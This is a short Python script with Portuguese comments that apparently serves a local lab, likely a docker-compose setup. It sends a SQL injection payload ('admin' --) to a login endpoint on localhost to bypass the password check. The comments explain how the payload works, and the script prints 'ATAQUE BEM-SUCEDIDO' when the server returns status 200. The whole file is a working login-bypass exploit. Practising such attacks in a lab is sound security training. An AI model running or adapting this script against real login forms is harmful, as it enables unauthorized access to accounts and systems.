import requests
import json

# 1. O Alvo
url_alvo = "http://127.0.0.1:8080/login"

# 2. O Payload de Ataque
#    admin' --
#    A ' fecha o campo 'username'
#    O -- comenta o resto da linha, ignorando a checagem de senha
payload_ataque = {
    "usuario": "admin' --",
    "senha": "qualquercoisa" 
}

print(f"Enviando payload de ataque para: {url_alvo}")
print(f"Payload: {payload_ataque}")

try:
    # 3. Enviar o POST
    response = requests.post(url_alvo, json=payload_ataque) # nosec

    # 4. Analisar a Resposta
    print("\n--- Resposta do Servidor ---")
    print(f"Status Code: {response.status_code}")
    
    try:
        # Imprime o JSON formatado
        print("Resposta (JSON):")
        print(json.dumps(response.json(), indent=2))
        
        # 5. Veredito
        if response.status_code == 200:
            print("\nVEREDITO: ATAQUE BEM-SUCEDIDO! Login bypassado.")
        else:
            print("\nVEREDITO: Ataque falhou.")
            
    except requests.exceptions.JSONDecodeError:
        print(f"Resposta (Texto): {response.text}")

except requests.exceptions.ConnectionError:
    print("\nERRO: Não foi possível se conectar.")
    print("Verifique se o seu 'docker-compose up' está rodando.")
